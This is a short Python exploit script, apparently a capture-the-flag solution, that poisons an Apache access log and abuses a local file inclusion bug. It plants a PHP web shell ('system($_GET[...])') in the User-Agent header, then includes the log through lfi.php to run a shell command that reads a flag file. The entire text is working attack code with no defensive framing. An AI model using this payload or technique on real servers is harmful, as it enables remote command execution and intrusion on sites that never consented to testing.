#!/usr/bin/env python3

import requests

s = requests.Session()
ip = "10.10.202.17"
url = f"http://{ip}:80/lfi/lfi.php?page=/var/log/apache2/access.log"

def forward_malicious_header():
	# injecting php code in the headers
	print("[+] Forwarding malicious php header :)")
	headers = {'User-Agent': "Mozilla/5.0 <?php system($_GET['lfi']); ?> Firefox/70.0"}
	r = s.get(url, headers=headers)
	print("[+] Done!")
	return True if r.text else False
	
if forward_malicious_header():
	url = url + "&lfi=cat /home/lfi/flag.txt"
	print("[+] Executing log")
	r = s.get(url)
	print(r.headers)
	print("-" * 20)
	print(r.text)
